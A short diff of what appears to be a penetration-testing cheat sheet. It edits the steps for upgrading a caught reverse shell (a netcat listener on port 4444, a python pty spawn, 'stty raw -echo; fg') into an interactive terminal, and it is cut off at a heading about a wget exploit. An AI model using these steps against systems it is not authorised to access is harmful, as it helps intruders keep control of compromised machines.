@@ -263,8 +263,9 @@ rlwrap nc -nlvp 4444
 - **Some time the terminal shell is not given then we have to do this!**
 ```sh
 python -c "import pty; pty.spawn('/bin/bash')"
-
-stty raw -echo
+export TERM=xterm
+Ctrl+Z
+stty raw -echo; fg
 ```
 ## Exploit for `wget`
 ```sh
